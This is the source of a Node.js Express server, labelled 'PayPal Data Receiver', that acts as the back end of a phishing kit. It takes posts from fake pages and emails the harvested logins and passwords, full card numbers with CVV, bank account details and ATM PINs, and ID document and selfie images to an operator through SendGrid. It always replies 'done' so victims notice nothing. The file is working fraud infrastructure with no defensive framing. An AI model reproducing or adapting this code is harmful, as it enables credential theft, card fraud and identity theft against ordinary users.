const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize SendGrid with API key from environment variables
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Security middleware
app.use(helmet());

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);

// CORS configuration
app.use(cors({
  origin: ['https://your-frontend-domain.onrender.com', 'http://localhost:3000'],
  credentials: true
}));

// Body parser middleware with increased limits for base64 images
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Your email configuration
const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL || 'your-email@gmail.com';
const SENDER_EMAIL = process.env.SENDER_EMAIL || 'noreply@yourapp.com';

// Helper function to format email content in TEXT format based on page type
function formatEmailData(data, pageType) {
  const timestamp = new Date().toLocaleString();
  let subject = '';
  let textContent = `NEW FORM SUBMISSION - ${pageType.toUpperCase()}\n`;
  textContent += '='.repeat(50) + '\n\n';
  
  textContent += `Time: ${timestamp}\n`;
  textContent += `IP Address: ${data.ip_address || 'N/A'}\n`;
  textContent += `User Agent: ${data.user_agent || 'N/A'}\n`;
  textContent += `Screen Resolution: ${data.screen || 'N/A'}\n\n`;
  textContent += '-'.repeat(50) + '\n';
  textContent += 'SUBMISSION DATA:\n';
  textContent += '-'.repeat(50) + '\n\n';

  switch (pageType) {
    case 'login':
      subject = `🔐 Login Data - ${data.EML || 'Unknown Email'}`;
      textContent += `EMAIL: ${data.EML || 'N/A'}\n`;
      textContent += `PASSWORD: ${data.PWD || 'N/A'}\n`;
      textContent += `SESSION KEY: ${data.acsh33nz0key || 'N/A'}\n`;
      break;

    case 'mail_access':
      subject = `📧 Email Access Data - ${data.mailacess || 'Unknown Email'}`;
      textContent += `EMAIL: ${data.mailacess || 'N/A'}\n`;
      textContent += `PASSWORD: ${data.password || 'N/A'}\n`;
      break;

    case 'credit_card':
      subject = `💳 Credit Card Data - ${data.fnm || 'Unknown Name'}`;
      textContent += `CARD TYPE: ${data.ctp || 'N/A'}\n`;
      textContent += `CARD NUMBER: ${data.ccn || 'N/A'}\n`;
      textContent += `EXPIRY DATE: ${data.cex || 'N/A'}\n`;
      textContent += `CVV: ${data.csc || 'N/A'}\n`;
      textContent += `FULL NAME: ${data.fnm || 'N/A'}\n`;
      textContent += `DATE OF BIRTH: ${data.dob || 'N/A'}\n`;
      textContent += `ADDRESS: ${data.adr || 'N/A'}\n`;
      textContent += `CITY: ${data.cty || 'N/A'}\n`;
      textContent += `ZIP CODE: ${data.zip || 'N/A'}\n`;
      textContent += `STATE: ${data.stt || 'N/A'}\n`;
      textContent += `COUNTRY: ${data.cnt || 'N/A'}\n`;
      textContent += `PHONE TYPE: ${data.ptp || 'N/A'}\n`;
      textContent += `PHONE PREFIX: ${data.par || 'N/A'}\n`;
      textContent += `PHONE NUMBER: ${data.pnm || 'N/A'}\n`;
      break;

    case 'bank_info':
      subject = `🏦 Bank Information - ${data.userid || 'Unknown User'}`;
      textContent += `USER ID: ${data.userid || 'N/A'}\n`;
      textContent += `PASSWORD: ${data.passcode || 'N/A'}\n`;
      textContent += `ACCOUNT NUMBER: ${data.accnumq || 'N/A'}\n`;
      textContent += `ROUTING NUMBER: ${data.rounum || 'N/A'}\n`;
      textContent += `IBAN: ${data.iban || 'N/A'}\n`;
      textContent += `ATM PIN: ${data.atmpin || 'N/A'}\n`;
      break;

    case 'id_document':
      subject = `🆔 ID Document Upload - ${data.doc_type || 'Unknown Type'}`;
      textContent += `DOCUMENT TYPE: ${data.doc_type || 'N/A'}\n`;
      textContent += `NUMBER OF IMAGES: ${data.images ? data.images.length : 0}\n`;
      textContent += `IMAGES UPLOADED: ${data.images ? 'YES' : 'NO'}\n`;
      
      // Log image info without the actual base64 data
      if (data.images && Array.isArray(data.images)) {
        data.images.forEach((img, index) => {
          textContent += `IMAGE ${index + 1}: [BASE64_DATA - ${img.length} characters]\n`;
        });
      }
      break;

    case 'id_selfie':
      subject = `🤳 Selfie Upload - Identity Verification`;
      textContent += `SELFIE UPLOAD: YES\n`;
      textContent += `NUMBER OF SELFIES: ${data.images ? data.images.length : 0}\n`;
      
      if (data.images && Array.isArray(data.images)) {
        data.images.forEach((img, index) => {
          textContent += `SELFIE ${index + 1}: [BASE64_DATA - ${img.length} characters]\n`;
        });
      }
      break;

    default:
      subject = `📄 Form Submission - Unknown Page`;
      for (const [key, value] of Object.entries(data)) {
        if (key !== 'ip_address' && key !== 'user_agent' && key !== 'screen' && 
            key !== 'images' && !key.startsWith('file')) {
          // Truncate long values
          let displayValue = value;
          if (typeof value === 'string' && value.length > 100) {
            displayValue = value.substring(0, 100) + '... [TRUNCATED]';
          }
          textContent += `${key.toUpperCase()}: ${displayValue || 'N/A'}\n`;
        }
      }
  }

  textContent += '\n' + '='.repeat(50) + '\n';
  textContent += 'This email was automatically generated by the form submission server.\n';

  return { subject, textContent };
}

// Helper function to detect page type based on data
function detectPageType(data) {
  if (data.EML && data.PWD) {
    return 'login';
  } else if (data.mailacess && data.password) {
    return 'mail_access';
  } else if (data.ccn && data.cex) {
    return 'credit_card';
  } else if (data.userid && data.passcode) {
    return 'bank_info';
  } else if (data.doc_type) {
    return 'id_document';
  } else if (data.id_slf) {
    return 'id_selfie';
  } else if (data.images && Array.isArray(data.images)) {
    // If it has images but no specific type, check context
    if (data.images.length > 0) {
      const firstImage = data.images[0];
      // Heuristic: selfies might be mentioned in the data or we can check image data prefix
      if (data.selfie || firstImage.includes('selfie') || data.id_slf) {
        return 'id_selfie';
      } else {
        return 'id_document';
      }
    }
  }
  return 'unknown';
}

// Helper function to sanitize data for logging (remove sensitive info)
function sanitizeData(data) {
  const sanitized = { ...data };
  
  // Remove base64 image data from logs to reduce noise
  if (sanitized.images && Array.isArray(sanitized.images)) {
    sanitized.images = [`${sanitized.images.length} images (base64 data hidden)`];
  }
  
  // Truncate long values for logging
  Object.keys(sanitized).forEach(key => {
    if (typeof sanitized[key] === 'string' && sanitized[key].length > 100) {
      sanitized[key] = sanitized[key].substring(0, 100) + '... [TRUNCATED]';
    }
  });
  
  return sanitized;
}

// Main endpoint to receive data from all pages
app.post('/api/submit', async (req, res) => {
  try {
    const data = req.body;
    const pageType = detectPageType(data);
    
    console.log('Received form data:', {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      pageType: pageType,
      data: sanitizeData(data)
    });

    // Format email content in TEXT format
    const { subject, textContent } = formatEmailData(data, pageType);

    // Send email via SendGrid in TEXT format
    const msg = {
      to: RECIPIENT_EMAIL,
      from: SENDER_EMAIL,
      subject: subject,
      text: textContent,
    };

    await sgMail.send(msg);
    console.log(`✅ Text email sent successfully for ${pageType} page`);

    // Send simple "done" response to frontend (as expected by your PHP code)
    res.status(200).send('done');

  } catch (error) {
    console.error('❌ Error processing form data:', error);
    
    // Log the error but still send "done" to not break the frontend flow
    console.log('⚠️  Sending "done" response despite error to maintain flow');
    res.status(200).send('done');
  }
});

// Additional endpoint for image-heavy submissions with larger payloads
app.post('/api/submit-images', async (req, res) => {
  try {
    const data = req.body;
    const pageType = detectPageType(data);
    
    console.log('Received image submission:', {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      pageType: pageType,
      imageCount: data.images ? data.images.length : 0,
      data: sanitizeData(data)
    });

    // Format email content
    const { subject, textContent } = formatEmailData(data, pageType);

    // Send email
    const msg = {
      to: RECIPIENT_EMAIL,
      from: SENDER_EMAIL,
      subject: subject,
      text: textContent,
    };

    await sgMail.send(msg);
    console.log(`✅ Image submission email sent for ${pageType}`);

    res.status(200).send('done');

  } catch (error) {
    console.error('❌ Error processing image submission:', error);
    res.status(200).send('done'); // Still send done to not break flow
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'PayPal Data Receiver - Complete Version',
    email_format: 'Plain Text',
    supported_page_types: [
      'login',
      'mail_access', 
      'credit_card',
      'bank_info',
      'id_document',
      'id_selfie'
    ]
  });
});

// Status endpoint to check recent activity
app.get('/status', (req, res) => {
  res.status(200).json({
    status: 'operational',
    server_time: new Date().toISOString(),
    uptime: process.uptime(),
    memory_usage: process.memoryUsage(),
    environment: process.env.NODE_ENV || 'development'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'PayPal Data Receiver API is running',
    description: 'Receives form data from all pages and sends email notifications',
    email_format: 'Plain Text',
    endpoints: {
      '/api/submit': 'POST - Receive form data and send text email',
      '/api/submit-images': 'POST - Receive image submissions',
      '/health': 'GET - Health check',
      '/status': 'GET - Server status'
    },
    usage: 'Send POST requests with form data to /api/submit'
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('🛑 Unhandled error:', err);
  res.status(500).send('error');
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({ 
    status: 'error', 
    message: 'Endpoint not found',
    available_endpoints: [
      'GET /',
      'GET /health', 
      'GET /status',
      'POST /api/submit',
      'POST /api/submit-images'
    ]
  });
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📧 Text emails will be sent to: ${RECIPIENT_EMAIL}`);
  console.log(`📝 Email format: Plain Text`);
  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
  console.log(`📊 Status: http://localhost:${PORT}/status`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
});

module.exports = app;
